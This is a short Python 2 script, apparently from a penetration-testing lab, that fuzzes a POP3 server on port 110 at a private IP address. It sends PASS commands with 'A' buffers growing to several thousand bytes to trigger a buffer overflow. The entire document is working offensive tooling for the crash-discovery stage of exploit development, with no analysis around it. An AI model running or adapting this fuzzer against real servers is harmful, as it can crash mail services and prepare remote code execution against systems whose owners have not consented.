#!/usr/bin/python
import socket
ip = "172.16.5.129"
# create an array of buffers
buffer=["A"]
c = 100
while len(buffer) <= 30:
    buffer.append("A"*c)
    c=c+200

for buff in buffer:
    print "Fuzzing with %s bytes" % len(buff)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((ip, 110))
    s.recv(1024)
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('Pass ' + buff + '\r\n')
    s.send('QUIT\r\n')
    s.close()
